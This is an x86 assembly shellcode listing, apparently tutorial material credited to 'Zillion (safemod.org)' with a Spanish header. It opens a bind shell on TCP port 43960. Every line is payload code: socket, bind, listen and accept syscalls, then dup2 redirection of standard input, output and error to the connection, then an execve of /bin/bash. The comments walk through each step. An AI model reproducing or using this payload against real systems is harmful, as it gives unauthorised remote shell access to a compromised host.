;Ejemplo 2, ejecución de un shell remoto- puerto 43960, 
;por Zillion (safemod.org)
BITS 32
   xor             eax, eax             ; NULL eax
   inc             eax                  ; eax represents 1 now 
   mov long        [esi +12],eax        ; 
   mov             ebx,eax
   inc             eax
   mov long        [esi +8],eax
   add             al,0x04
   mov long        [esi +16],eax
   lea             ecx,[esi +8]
   mov             al,102                ; 102 == socketcall
   int             0x80                  ; call the kernel
   mov             edx,eax               ; store the file descriptor in 
                                         ; edx 
   xor             eax, eax              ; Null eax
                                         ; Now lets make the  serv_addr 
                                         ; struct  
   mov byte        [esi + 8],0x02        ; This equals: 
                                         ; serv_addr.sin_family=2
   mov word        [esi + 10],0xAAAA     ; This equals: 
                                         ; serv_addr.sin_port=0xAAAA
   mov long        [esi + 12],eax        ; This equals: 
                                         ; serv_addr.sin_addr.s_addr=0
   mov long        [esi + 17],edx        ; edx the file descriptor
   lea             ecx,[esi + 8]         ; load effective address of the 
                                         ; struct
   mov long        [esi + 21],ecx        ; and store it in [esi + 21]
   inc             ebx                     
   mov             ecx,ebx        
   add             cl,14
   mov long        [esi + 25],ecx
   lea             ecx,[esi +17]
   mov             al,102
   int             0x80
   mov             al,102
   inc ebx
   inc ebx
   int             0x80
   xor             eax,eax
   inc             ebx
   mov long        [esi + 21],eax
   mov long        [esi + 25],eax
   mov             al,102
   int             0x80   
   mov             ebx,eax               ; Save the file descriptor in 
                                         ; ebx
   xor             eax,eax               ; NULL eax
   mov long        [esi + 12], eax       ; 
   mov             ecx,eax               ; 0 == stdin 
   mov             al,63                 ; dub2()
   int             0x80                  ; Call kernel
   inc             ecx                   ; 1 == stdout 
   mov             al,63                 ; dub2()
   int             0x80                  ; Call kernel 
   inc             ecx                   ; 2 == stderr
   mov             al,63                 ; dub2()
   int             0x80                  ; Call kernel  
                                       ; From here it is just a matter of   
   jmp short       callit                ; executing a shell (/bin/bash)
doit:
   pop             esi
   xor             eax, eax
   mov byte        [esi + 9], al
   lea             ebx, [esi]
   mov long        [esi + 11], ebx
   mov long        [esi + 15], eax
   mov byte        al, 0x0b
   mov             ebx, esi
   lea             ecx, [esi + 11]
   lea             edx, [esi + 15]
   int             0x80
callit:
   call            doit
   db              '/bin/bash'

